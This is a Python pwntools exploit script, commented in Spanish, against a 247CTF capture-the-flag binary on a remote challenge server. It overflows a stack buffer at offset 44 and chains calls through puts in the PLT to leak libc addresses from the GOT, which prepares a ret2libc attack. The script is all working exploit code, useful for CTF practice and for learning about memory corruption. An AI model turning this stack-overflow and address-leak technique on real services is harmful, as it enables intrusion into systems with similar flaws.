#!/usr/bin/env python3
from pwn import *

# Configuración
context.arch = 'i386'
context.log_level = 'info'

# Cargar binario
elf = ELF('./non_executable_stack')

# Direcciones importantes
puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
chall_addr = elf.symbols['chall']
main_addr = elf.symbols['main']

# GOT entries
puts_got = elf.got['puts']
gets_got = elf.got['gets']
strcmp_got = elf.got['strcmp']

print(f"[*] PLT puts: {hex(puts_plt)}")
print(f"[*] chall: {hex(chall_addr)}")
print(f"[*] main: {hex(main_addr)}")

# Conectar al servidor remoto
host, port = '44a148766800f366.247ctf.com', 50150
p = remote(host, port)

# Recibir prompt
p.recvline()

# Offset correcto
offset = 44

# STAGE 1: Leak múltiples direcciones
print("[*] Stage 1: Leaking libc addresses")

# Leak puts
payload1 = b'A' * offset
payload1 += p32(puts_plt)
payload1 += p32(chall_addr)  # volver a chall
payload1 += p32(puts_got)

p.sendline(payload1)
p.recvline()  # "Incorrect secret password!"
puts_leak = u32(p.recv(4))
print(f"[+] Leaked puts: {hex(puts_leak)}")

# Leak gets
p.recvline()  # newline + "Enter the secret password:"
payload2 = b'A' * offset
payload2 += p32(puts_plt)
payload2 += p32(chall_addr)
payload2 += p32(gets_got)

p.sendline(payload2)
p.recvline()  # "Incorrect secret password!"
gets_leak = u32(p.recv(4))
print(f"[+] Leaked gets: {hex(gets_leak)}")

# Leak strcmp
p.recvline()  # newline + "Enter the secret password:"
payload3 = b'A' * offset
payload3 += p32(puts_plt)
payload3 += p32(chall_addr)
payload3 += p32(strcmp_got)

p.sendline(payload3)
p.recvline()  # "Incorrect secret password!"
strcmp_leak = u32(p.recv(4))
print(f"[+] Leaked strcmp: {hex(strcmp_leak)}")

print("\n[*] Use these addresses to find libc version:")
print(f"puts: {hex(puts_leak)}")
print(f"gets: {hex(gets_leak)}")
print(f"strcmp: {hex(strcmp_leak)}")

# Guardar los últimos 3 dígitos hex para buscar en libc-database
print(f"\n[*] Last 3 hex digits:")
print(f"puts: {hex(puts_leak & 0xfff)}")
print(f"gets: {hex(gets_leak & 0xfff)}")
print(f"strcmp: {hex(strcmp_leak & 0xfff)}")

p.close()
